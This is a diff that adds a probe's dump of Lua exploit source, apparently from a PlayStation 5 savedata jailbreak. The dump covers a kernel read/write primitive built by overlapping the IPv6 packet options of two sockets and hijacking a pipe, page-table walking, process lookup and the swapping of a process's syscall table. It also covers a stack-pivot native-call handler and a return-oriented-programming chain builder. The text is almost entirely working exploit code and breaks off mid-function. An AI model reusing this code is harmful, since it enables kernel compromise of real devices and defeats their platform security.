@@ -1,0 +1,1937 @@
+=== PROBE 150a: DUMP KERNEL.LUA ===
+--- KERNEL.LUA (13531 bytes) ---
+
+-- class for kernel memory r/w
+
+kernel = {}
+
+kernel.addr = {}
+
+-- these vars need to be defined for other fns to work properly
+kernel.copyout = nil
+kernel.copyin = nil
+kernel.read_buffer = nil
+kernel.write_buffer = nil
+
+function kernel.read_byte(kaddr)
+    local value = kernel.read_buffer(kaddr, 1)
+    return value and #value == 1 and uint64.unpack(value) or nil 
+end
+
+function kernel.read_word(kaddr)
+    local value = kernel.read_buffer(kaddr, 2)
+    return value and #value == 2 and uint64.unpack(value) or nil 
+end
+
+function kernel.read_dword(kaddr)
+    local value = kernel.read_buffer(kaddr, 4)
+    return value and #value == 4 and uint64.unpack(value) or nil 
+end
+
+function kernel.read_qword(kaddr)
+    local value = kernel.read_buffer(kaddr, 8)
+    return value and #value == 8 and uint64.unpack(value) or nil 
+end
+
+function kernel.hex_dump(kaddr, size)
+    size = size or 0x40
+    return hex_dump(kernel.read_buffer(kaddr, size), kaddr)
+end
+
+function kernel.read_null_terminated_string(kaddr)
+    
+    local result = ""
+
+    while true do
+        local chunk = kernel.read_buffer(kaddr, 0x8)
+        local null_pos = chunk:find("\0")
+        if null_pos then 
+            return result .. chunk:sub(1, null_pos - 1)
+        end
+        result = result .. chunk
+        kaddr = kaddr + #chunk
+    end
+    
+    if string.byte(result[1]) == 0 then
+        return nil
+    end
+
+    return result
+end
+
+function kernel.write_byte(dest, value)
+    kernel.write_buffer(dest, ub8(value):sub(1,1))
+end
+
+function kernel.write_word(dest, value)
+    kernel.write_buffer(dest, ub8(value):sub(1,2))
+end
+
+function kernel.write_dword(dest, value)
+    kernel.write_buffer(dest, ub8(value):sub(1,4))
+end
+
+function kernel.write_qword(dest, value)
+    kernel.write_buffer(dest, ub8(value):sub(1,8))
+end
+
+
+
+
+
+-- provide fast kernel r/w through pipe pair & ipv6
+
+ipv6_kernel_rw = {}
+
+ipv6_kernel_rw.data = {}
+
+function ipv6_kernel_rw.init(ofiles, kread8, kwrite8)
+
+    ipv6_kernel_rw.ofiles = ofiles
+    ipv6_kernel_rw.kread8 = kread8
+    ipv6_kernel_rw.kwrite8 = kwrite8
+
+    ipv6_kernel_rw.create_pipe_pair()
+    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
+end
+
+function ipv6_kernel_rw.get_fd_data_addr(fd)
+    local filedescent_addr = ipv6_kernel_rw.ofiles + fd * kernel_offset.SIZEOF_OFILES
+    local file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0) -- fde_file
+    return ipv6_kernel_rw.kread8(file_addr + 0x0) -- f_data
+end
+
+function ipv6_kernel_rw.create_pipe_pair()
+
+    local read_fd, write_fd = create_pipe()
+    
+    ipv6_kernel_rw.data.pipe_read_fd = read_fd
+    ipv6_kernel_rw.data.pipe_write_fd = write_fd
+    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
+    ipv6_kernel_rw.data.pipemap_buffer = memory.alloc(0x14)
+    ipv6_kernel_rw.data.read_mem = memory.alloc(PAGE_SIZE)
+end
+
+-- overlap the pktopts of two IPV6 sockets
+function ipv6_kernel_rw.create_overlapped_ipv6_sockets()
+
+    local master_target_buffer = memory.alloc(0x14)
+    local slave_buffer = memory.alloc(0x14)
+    local pktinfo_size_store = memory.alloc(0x8)
+    
+    memory.write_qword(pktinfo_size_store, 0x14)
+
+    local master_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+    local victim_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+
+    syscall.setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
+    syscall.setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)
+
+    local master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock)
+    local master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB)
+    local master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS)
+
+    local slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock)
+    local slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB)
+    local slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS)
+
+    -- magic
+    ipv6_kernel_rw.kwrite8(master_pktopts + 0
+x10, slave_pktopts + 0x10)
+
+    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
+    ipv6_kernel_rw.data.slave_buffer = slave_buffer
+    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
+    ipv6_kernel_rw.data.master_sock = master_sock
+    ipv6_kernel_rw.data.victim_sock = victim_sock
+end
+
+function ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer, kaddr)
+    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer + 0x8, 0)
+    memory.write_dword(ipv6_kernel_rw.data.master_target_buffer + 0x10, 0)
+    syscall.setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
+end
+
+function ipv6_kernel_rw.ipv6_kread(kaddr, buffer_addr)
+    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+    syscall.getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
+end
+
+function ipv6_kernel_rw.ipv6_kwrite(kaddr, buffer_addr)
+    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+    syscall.setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
+end
+
+function ipv6_kernel_rw.ipv6_kread8(kaddr)
+    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
+    return memory.read_qword(ipv6_kernel_rw.data.slave_buffer)
+end
+
+function ipv6_kernel_rw.copyout(kaddr, uaddr, len)
+
+    assert(kaddr and uaddr and len)
+
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, uint64("0x4000000040000000"))
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
+    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
+
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
+    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
+    
+    syscall.read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
+end
+
+function ipv6_kernel_rw.copyin(uaddr, kaddr, len)
+
+    assert(kaddr and uaddr and len)
+
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, 0)
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
+    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
+
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
+    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
+
+    syscall.write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
+end
+
+function ipv6_kernel_rw.read_buffer(kaddr, len)
+
+    local mem = ipv6_kernel_rw.data.read_mem
+    if len > PAGE_SIZE then
+        mem = memory.alloc(len)
+    end
+
+    ipv6_kernel_rw.copyout(kaddr, mem, len)
+    return memory.read_buffer(mem, len)
+end
+
+function ipv6_kernel_rw.write_buffer(kaddr, buf)
+    ipv6_kernel_rw.copyin(lua.resolve_value(buf), kaddr, #buf)
+end
+
+
+
+
+
+-- cpu page table
+
+CPU_PDE_SHIFT = {
+    PRESENT = 0,
+    RW = 1,
+    USER = 2,
+    WRITE_THROUGH = 3,
+    CACHE_DISABLE = 4,
+    ACCESSED = 5,
+    DIRTY = 6,
+    PS = 7,
+    GLOBAL = 8,
+    XOTEXT = 58,
+    PROTECTION_KEY = 59,
+    EXECUTE_DISABLE = 63
+}
+
+CPU_PDE_MASKS = {
+    PRESENT = 1,
+    RW = 1,
+    USER = 1,
+    WRITE_THROUGH = 1,
+    CACHE_DISABLE = 1,
+    ACCESSED = 1,
+    DIRTY = 1,
+    PS = 1,
+    GLOBAL = 1,
+    XOTEXT = 1,
+    PROTECTION_KEY = 0xf,
+    EXECUTE_DISABLE = 1
+}
+
+CPU_PG_PHYS_FRAME = uint64("0x000ffffffffff000")
+CPU_PG_PS_FRAME = uint64("0x000fffffffe00000")
+
+function cpu_pde_field(pde, field)
+    local shift = CPU_P
+DE_SHIFT[field]
+    local mask = CPU_PDE_MASKS[field]
+    return bit64.band(bit64.rshift(pde, shift), mask):tonumber()
+end
+
+function cpu_walk_pt(cr3, vaddr)
+
+    assert(vaddr, cr3)
+
+    local pml4e_index = bit64.band(bit64.rshift(vaddr, 39), 0x1ff)
+    local pdpe_index = bit64.band(bit64.rshift(vaddr, 30), 0x1ff)
+    local pde_index = bit64.band(bit64.rshift(vaddr, 21), 0x1ff)
+    local pte_index = bit64.band(bit64.rshift(vaddr, 12), 0x1ff)
+
+    -- pml4
+
+    local pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8)
+    if cpu_pde_field(pml4e, "PRESENT") ~= 1 then
+        return nil
+    end
+
+    -- pdp
+
+    local pdp_base_pa = bit64.band(pml4e, CPU_PG_PHYS_FRAME)
+    local pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8
+    local pdpe = kernel.read_qword(pdpe_va)
+
+    if cpu_pde_field(pdpe, "PRESENT") ~= 1 then
+        return nil
+    end
+
+    -- pd
+
+    local pd_base_pa = bit64.band(pdpe, CPU_PG_PHYS_FRAME)
+    local pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8
+    local pde = kernel.read_qword(pde_va)
+
+    if cpu_pde_field(pde, "PRESENT") ~= 1 then
+        return nil
+    end
+
+    -- large page
+    if cpu_pde_field(pde, "PS") == 1 then
+        return bit64.bor(
+            bit64.band(pde, CPU_PG_PS_FRAME),
+            bit64.band(vaddr, 0x1fffff)
+        )
+    end
+
+    -- pt
+
+    local pt_base_pa = bit64.band(pde, CPU_PG_PHYS_FRAME)
+    local pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
+    local pte = kernel.read_qword(pte_va)
+
+    if cpu_pde_field(pte, "PRESENT") ~= 1 then
+        return nil
+    end
+
+    return bit64.bor(
+        bit64.band(pte, CPU_PG_PHYS_FRAME),
+        bit64.band(vaddr, 0x3fff)
+    )
+end
+
+
+
+
+
+-- setup kernel r/w for the loader
+function initialize_kernel_rw()
+
+    local state = storage.get("kernel_rw")
+    if state then
+
+        -- copy ipv6 states given by the exploit
+        ipv6_kernel_rw.data = state.ipv6_kernel_rw_data
+        
+        -- copy existing resolved addresses from exploit
+        kernel.addr = state.kernel_addr
+        
+        -- enable kernel r/w through ipv6 + pipe
+        kernel.copyout = ipv6_kernel_rw.copyout
+        kernel.copyin = ipv6_kernel_rw.copyin
+        kernel.read_buffer = ipv6_kernel_rw.read_buffer
+        kernel.write_buffer = ipv6_kernel_rw.write_buffer
+
+        kernel.rw_initialized = true
+
+        update_kernel_offsets()
+    end
+end
+
+
+function is_kernel_rw_available()
+    return kernel.read_buffer and kernel.write_buffer
+end
+
+function check_kernel_rw()
+    if not is_kernel_rw_available() then
+        error("kernel r/w is not available")
+    end
+end
+
+
+-- useful functions
+
+function find_proc_by_name(name)
+
+    check_kernel_rw()
+    assert(kernel.addr.allproc)
+
+    local proc = kernel.read_qword(kernel.addr.allproc)
+    while proc ~= uint64(0) do
+
+        local proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM)
+        if proc_name == name then
+            return proc
+        end
+
+        proc = kernel.read_qword(proc + 0x0) -- le_next
+    end
+
+    return nil
+end
+
+
+function find_proc_by_pid(pid)
+
+    check_kernel_rw()
+    assert(kernel.addr.allproc)
+
+    assert(type(pid) == "number")
+
+    local proc = kernel.read_qword(kernel.addr.allproc)
+    while proc ~= uint64(0) do
+
+        local proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID):tonumber()
+        if proc_pid == pid then
+            return proc
+        end
+
+        proc = kernel.read_qword(proc + 0x0) -- le_next
+    end
+
+    return nil
+end
+
+
+function get_proc_cr3(proc)
+    
+    check_kernel_rw()
+    
+    local vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE)
+    local pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP)
+    
+    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3)
+end
+
+-- translate virtual address to physical address
+-- note: use kernel page table if cr3 is not given
+function virt_to_phys(virt_addr, cr3)
+    
+    check_kernel_rw()
+    assert(kernel.addr.dmap_base and virt_addr)
+    
+    cr3 = cr3
+ or kernel.addr.kernel_cr3
+    return cpu_walk_pt(cr3, virt_addr)
+end
+
+
+function phys_to_dmap(phys_addr)
+    assert(kernel.addr.dmap_base and phys_addr)
+    return kernel.addr.dmap_base + phys_addr
+end
+
+
+-- replace curproc sysent with sysent of other ps5 process
+-- note: failure to restore curproc sysent will have side effect on the game/ps
+function run_with_ps5_syscall_enabled(f)
+
+    check_kernel_rw()
+
+    local target_proc_name = "SceGameLiveStreaming" -- arbitrarily chosen ps5 process
+
+    local target_proc = find_proc_by_name(target_proc_name) 
+    if not target_proc then
+        errorf("failed to find proc addr of %s", target_proc_name)
+    end
+
+    local cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT)  -- struct sysentvec
+    local target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT)
+
+    local cur_table_size = kernel.read_dword(cur_sysent) -- sv_size
+    local target_table_size = kernel.read_dword(target_sysent)
+
+    local cur_table = kernel.read_qword(cur_sysent + 0x8) -- sv_table
+    local target_table = kernel.read_qword(target_sysent + 0x8)
+
+    -- replace with target sysent
+    kernel.write_dword(cur_sysent, target_table_size)
+    kernel.write_qword(cur_sysent + 0x8, target_table)
+
+    -- catch lua error so we can restore sysent
+    local err = run_with_coroutine(f)
+    if err then
+        print(err)
+    end
+    
+    -- restore back
+    kernel.write_dword(cur_sysent, cur_table_size)
+    kernel.write_qword(cur_sysent + 0x8, cur_table) 
+end
+
+
+--- END KERNEL.LUA ---
+
+--- /savedata0/native.lua (8273 bytes) ---
+
+native_cmd = {
+    read_buffer = 0,
+    write_buffer = 1,
+    fcall = 2,
+}
+
+native = {}
+
+function native.register()
+
+    local pivot_handler = gadgets.stack_pivot[2]
+    native.pivot_handler_rop = native.setup_pivot_handler(pivot_handler)
+    
+    native_cmd_handler = native.create_cmd_handler()
+    native_invoke = lua.create_fake_cclosure(pivot_handler.gadget_addr)
+
+    syscall.do_sanity_check()
+end
+
+function native.get_lua_opt(chain, fn, a1, a2, a3)
+    chain:push_fcall_raw(fn, function()
+        chain:push_set_rdx(a3)
+        chain:push_set_rsi(a2)
+        chain:push_set_reg_from_memory("rdi", a1)
+    end)
+    chain:push_store_retval()
+end
+
+function native.gen_fcall_chain(lua_state)
+
+    local chain = ropchain()
+    
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - fn addr
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 2 - rax (for syscall)
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 5, 0)  -- 3 - rdi
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 6, 0)  -- 4 - rsi
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 7, 0)  -- 5 - rdx
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 8, 0)  -- 6 - rcx
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 9, 0)  -- 7 - r8
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 10, 0)  -- 8 - r9
+
+    local prep_arg_callback = function()
+        chain:push_set_reg_from_memory("r9", chain.retval_addr[8])
+        chain:push_set_reg_from_memory("r8", chain.retval_addr[7])
+        chain:push_set_reg_from_memory("rcx", chain.retval_addr[6])
+        chain:push_set_reg_from_memory("rdx", chain.retval_addr[5])
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[4])
+        chain:push_set_reg_from_memory("rdi", chain.retval_addr[3])
+        chain:push_set_rax_from_memory(chain.retval_addr[2])
+    end
+
+    chain:push_fcall_raw(chain.retval_addr[1], prep_arg_callback, true)
+    chain:push_store_retval()
+
+    -- pass return value to caller
+    chain:push_fcall_raw(eboot_addrofs.lua_pushinteger, function()
+        chain:push_set_reg_from_memory("rsi", chain:get_last_retval_addr())
+        chain:push_set_reg_from_memory("rdi", lua_state)
+    end)
+
+    return chain
+end
+
+function native.gen_read_buffer_chain(lua_state)
+
+    local chain = ropchain()
+
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - addr to read
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 2 - size
+
+    chain:push_fcall_raw(eboot_addrofs.lua_pushlstring, function()
+        chain:push_set_reg_from_memory("rdx", chain.retval_addr[2])
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[1])
+        chain:push_set_reg_from_memory("rdi", lua_state)
+    end)
+
+    return chain
+end
+
+function native.gen_write_buffer_chain(lua_state)
+
+    local chain = ropchain()
+
+    chain.string_len = memory.alloc(0x8)
+
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - dest to write
+    native.get_lua_opt(chain, eboot_addrofs.luaL_checklstring, lua_state, 4, chain.string_len)  -- 2 - src buffer
+
+    chain:push_fcall_raw(libc_addrofs.memcpy, function()
+        chain:push_set_reg_from_memory("rdx", chain.string_len)
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[2])
+        chain:push_set_reg_from_memory("rdi", chain.retval_addr[1])
+    end)
+
+    return chain
+end
+
+function native.setup_cmd_handler(pivot_handler)
+
+    -- todo: setting hardcoded offset like this is bad. improve this
+    local stack_offset = -0x78
+    if game_name == "HamidashiCreative" or
+       game_name == "Aikagi2" or
+       game_name == "JinkiResurrection" or
+       game_name == "FuyuKiss" or
+       game_name == "C" or
+       game_name == "F" then
+        stack_offset = -0x68
+    end
+
+    local chain = ropchain()
+
+    chain.jmpbuf = memory.a
+lloc(0x100)
+    chain.jump_table = memory.alloc(0x8 * 16)
+
+    -- unlock native handler for other threads
+    chain:push_fcall(libc_addrofs.Mtx_unlock, pivot_handler.lock)
+
+    -- hacky way to recover rbp & r13
+    chain:push_fcall(libc_addrofs.setjmp, chain.jmpbuf)
+    chain:push_set_rax_from_memory(chain.jmpbuf+0x18) -- get rbp
+
+    -- fix jmpbuf
+    chain:push_add_to_rax(stack_offset)  -- calc rsp from rbp
+    chain:push_store_rax_into_memory(chain.jmpbuf+0x10)  -- fix rsp
+    chain:push(gadgets["mov rax, [rax]; ret"])  -- get ret addr from rsp
+    chain:push_store_rax_into_memory(chain.jmpbuf)  -- fix rip
+
+    chain.lua_state = chain.jmpbuf + 0x28  -- r13 (lua state)
+
+    -- get native cmd option from caller
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, chain.lua_state, 2, 0)
+
+    -- pivot to appropriate handler
+    chain:push_set_rax_from_memory(chain:get_last_retval_addr())
+    chain:dispatch_jumptable_with_rax_index(chain.jump_table)
+
+    return chain
+end
+
+function native.setup_native_handler(command_handler)
+
+    local handler = {
+        native.gen_read_buffer_chain(command_handler.lua_state),
+        native.gen_write_buffer_chain(command_handler.lua_state),
+        native.gen_fcall_chain(command_handler.lua_state),
+    }
+
+    for i, each_handler in ipairs(handler) do
+        each_handler:restore_through_longjmp(command_handler.jmpbuf)
+        memory.write_qword(command_handler.jump_table + 8*(i-1), each_handler.stack_base)    
+    end
+
+    return handler
+end
+
+function native.setup_pivot_handler(pivot_handler)
+
+    local MTX_DEF = 0 -- DEFAULT (sleep) lock
+
+    local Mtx_init = fcall(libc_addrofs.Mtx_init)
+
+    map_fixed_address(pivot_handler.pivot_base, 0x2000)
+
+    -- non modifying chains before fn call
+    local push_fcall_with_hole = function(chain, fn_addr, ...)
+        chain:push_sysv(...)
+        chain:align_stack()
+        chain:create_hole(0x500)
+        chain:push(fn_addr)
+        chain:push_write_qword_memory(chain:get_rsp() - 0x8, fn_addr)  -- fix chain
+    end
+
+    local chain = ropchain({
+        stack_base = pivot_handler.pivot_addr,
+    })
+
+    chain.lock = memory.alloc(0x8)
+    Mtx_init(chain.lock, MTX_DEF)
+
+    -- lock as this part might be called by multiple threads
+    push_fcall_with_hole(chain, libc_addrofs.Mtx_lock, chain.lock)
+
+    -- note:
+    -- we assume that r13 will always point to lua state.
+    -- this is at least true for aibeya / raspberry cube / hamidashi creative
+
+    -- hacky way to recover lua state (r13)
+    chain.jmpbuf = memory.alloc(0x100)
+    chain.lua_state = chain.jmpbuf + 0x28 -- r13
+    chain:push_fcall(libc_addrofs.setjmp, chain.jmpbuf)
+    
+    -- get native cmd handler from caller
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, chain.lua_state, 1, 0)
+
+    -- pivot to native cmd handler
+    chain:push_set_reg_from_memory("rsp", chain:get_last_retval_addr())
+
+    return chain
+end
+
+function native.create_cmd_handler()
+    local cmd_handler = native.setup_cmd_handler(native.pivot_handler_rop)
+    native.setup_native_handler(cmd_handler)
+    return cmd_handler.stack_base:tonumber()
+end
+
+function native.fcall_with_rax(fn_addr, rax, rdi, rsi, rdx, rcx, r8, r9)
+    assert(fn_addr)
+    return uint64(native_invoke(
+        native_cmd_handler,
+        native_cmd.fcall,
+        uint64(fn_addr):tonumber(),
+        uint64(rax or 0):tonumber(),
+        lua.resolve_value(rdi or 0):tonumber(),
+        lua.resolve_value(rsi or 0):tonumber(),
+        lua.resolve_value(rdx or 0):tonumber(),
+        lua.resolve_value(rcx or 0):tonumber(),
+        lua.resolve_value(r8 or 0):tonumber(),
+        lua.resolve_value(r9 or 0):tonumber()
+    ))
+end
+
+function native.fcall(fn_addr, rdi, rsi, rdx, rcx, r8, r9)
+    return native.fcall_with_rax(fn_addr, nil, rdi, rsi, rdx, rcx, r8, r9)
+end
+
+function native.read_buffer(addr, size)
+    assert(addr and size)
+    return native_invoke(
+        native_cmd_handler,
+        native_cmd.read_buffer,
+        lua.resolve_value(addr):tonu
+mber(),
+        lua.resolve_value(size):tonumber()
+    )
+end
+
+function native.write_buffer(addr, buf)
+    assert(addr and buf)
+    native_invoke(
+        native_cmd_handler,
+        native_cmd.write_buffer,
+        lua.resolve_value(addr):tonumber(),
+        buf
+    )
+end
+
+--- END native.lua ---
+
+--- /savedata0/ropchain.lua (18338 bytes) ---
+
+--
+-- ropchain class
+--
+-- helper for creating rop chains
+--
+
+ropchain = {}
+ropchain.__index = ropchain
+
+setmetatable(ropchain, {
+    __call = function(_, opt)  -- make class callable as constructor
+        return ropchain:new(opt)
+    end
+})
+
+function ropchain:new(opt)
+
+    opt = opt or {}
+
+    local self = setmetatable({}, ropchain)
+
+    if not ropchain.dont_recurse then
+        self.fcall_stub = ropchain.create_fcall_stub(opt.fcall_stub_padding_size or 0x2000)
+    end
+
+    self.stack_size = opt.stack_size or 0x2000
+    self.stack_base = opt.stack_base and uint64(opt.stack_base) or memory.alloc(self.stack_size)
+    self.align_offset = 0
+    self.stack_offset = 0
+
+    -- longjmp overwrites first stack slot with addr to ret gadget
+    self.push_ret(self)
+    
+    -- align stack base to 16 bytes
+    if self.stack_base:tonumber() % 16 ~= 0 then
+        local jmp_to = align_16(self.stack_base + self.stack_offset) + 0x20
+        self.push_set_rsp(self, jmp_to)
+        self.align_offset = jmp_to - self.stack_base
+        self.stack_offset = 0
+    end
+
+    self.retval_addr = {}
+
+    -- recover from call [rax+8] instruction
+    self.recover_from_call = memory.alloc(0x10)
+    memory.write_qword(self.recover_from_call+8, gadgets["pop rbx; ret"])
+
+    return self
+end
+
+function ropchain.create_fcall_stub(padding_size)
+
+    local fcall_stub = {}
+    fcall_stub.fn_addr = memory.alloc(padding_size) + (padding_size - 0x100)
+    
+    ropchain.dont_recurse = true
+    local stub = ropchain({
+        stack_base = fcall_stub.fn_addr,
+    })
+    ropchain.dont_recurse = false
+
+    stub:align_stack()
+    stub:push(0) -- fn addr
+    fcall_stub.fn_addr = stub:get_rsp() - 0x8
+
+    -- jmp back to ropchain
+    stub:push_set_rsp(0)
+    fcall_stub.return_addr = stub:get_rsp() - 0x8
+
+    return fcall_stub
+end
+
+function ropchain:__tostring()
+
+    local result = {}
+
+    table.insert(result, string.format("ropchain @ %s (size: %s)\n", 
+        hex(self.stack_base), hex(self.stack_offset)))
+
+    table.insert(result, string.format("fcall_stub.fn_addr: %s",
+        hex(self.fcall_stub.fn_addr)))
+
+    table.insert(result, string.format("fcall_stub.return_addr: %s\n",
+        hex(self.fcall_stub.return_addr)))
+
+    local qwords = memory.read_multiple_qwords(self.stack_base + self.align_offset, self.stack_offset / 8)
+
+    local value_symbol = {}
+    for i,t in ipairs({gadgets, eboot_addrofs, libc_addrofs}) do
+        for k,v in pairs(t) do
+            if k ~= "stack_pivot" then
+                value_symbol[hex(v)] = k
+            end
+        end
+    end
+
+    local idx = 1
+    while idx < #qwords+1 do
+        local offset = 8 * (idx-1)
+        local val = hex(qwords[idx])
+        if value_symbol[val] then
+            val = val .. string.format("\t; %s", value_symbol[val])
+        end
+        table.insert(result, string.format(
+            "%s: %s", hex(self.stack_base + self.align_offset + offset), val
+        ))
+        idx = idx + 1
+    end
+
+    return "\n" .. table.concat(result, "\n")
+end
+
+function ropchain:get_rsp() 
+    return self.stack_base + self.align_offset + self.stack_offset
+end
+
+-- align stack to 16 bytes
+function ropchain:align_stack()
+    if self.stack_offset % 16 == 8 then
+        self:push_ret()
+    end
+end
+
+function ropchain:increment_stack()
+
+    if self.stack_offset >= self.stack_size then
+        error("ropchain storage exhausted")
+    end
+
+    local rsp = self:get_rsp()
+    self.stack_offset = self.stack_offset + 8
+    return rsp
+end
+
+function ropchain:push(v)
+
+    if self.finalized then
+        error("ropchain has been finalized and cant be modified")
+    end
+
+    if self.enable_mock_push then
+        self:increment_stack()
+    else
+        memory.write_qword(self:increment_stack(), lua.resolve_value(v))
+    end
+end
+
+function ropchain:mock_push(callback)
+
+    local before_prep_offset = self.stack_offset
+
+    self.enable_mock_push = true
+    callback()
+    self.enable_mock_push = false
+    
+    local size = self.stack_offset - before_prep_offs
+et
+    self.stack_offset = before_prep_offset
+    
+    return size
+end
+
+function ropchain:push_ret()
+    self:push(gadgets["ret"])
+end
+
+function ropchain:push_set_rsp(v) 
+    self:push(gadgets["pop rsp; ret"])
+    self:push(v)
+end
+
+function ropchain:push_set_rbp(v) 
+    self:push(gadgets["pop rbp; ret"])
+    self:push(v)
+end
+
+function ropchain:push_set_rax(v)
+    self:push(gadgets["pop rax; ret"])
+    self:push(v)
+end
+
+function ropchain:push_set_rbx(v)
+    self:push(gadgets["pop rbx; ret"])
+    self:push(v)
+end
+
+function ropchain:push_set_rcx(v)
+    self:push(gadgets["pop rcx; ret"])
+    self:push(v)
+end
+function ropchain:push_set_rdx(v)
+    self:push(gadgets["pop rdx; ret"])
+    self:push(v)
+end
+
+function ropchain:push_set_rdi(v)
+    self:push(gadgets["pop rdi; ret"])
+    self:push(v)
+end
+
+function ropchain:push_set_rsi(v)
+    self:push(gadgets["pop rsi; ret"])
+    self:push(v)
+end
+
+function ropchain:push_set_r8(v)
+    self:push(gadgets["pop r8; ret"])
+    self:push(v)
+end
+
+-- clobbers rax, rbx / rax, r13, r14, r15
+function ropchain:push_set_r9(v)
+
+    local set_r9_gadget = nil
+    
+    if gadgets["mov r9, rbx; call [rax + 8]"] then
+        self:push_set_rax(self.recover_from_call)
+        self:push_set_rbx(v)
+        set_r9_gadget = gadgets["mov r9, rbx; call [rax + 8]"]
+    else
+        self:push_set_rax(self.recover_from_call)
+        self:push(gadgets["pop r13; pop r14; pop r15; ret"])
+        self:push(v)
+        set_r9_gadget = gadgets["mov r9, r13; call [rax + 8]"]
+    end
+
+    self:push_ret()
+    self:push_ret()
+    self:push(set_r9_gadget)
+
+    -- fix chain as `call` instruction corrupts set r9 gadget by pushing ret addr
+    self:push_write_qword_memory(self:get_rsp() - 0x8, set_r9_gadget)
+end
+
+function ropchain:push_set_r9_wo_call(v) -- clobbers rax, rsi, r8
+    temp_addr = bump.alloc(0x8)
+    memory.write_qword(self.recover_from_call, v)
+    self:push_set_rax(self.recover_from_call - 0x18)
+    self:push_set_rsi(0)
+    self:push_set_r8(temp_addr)
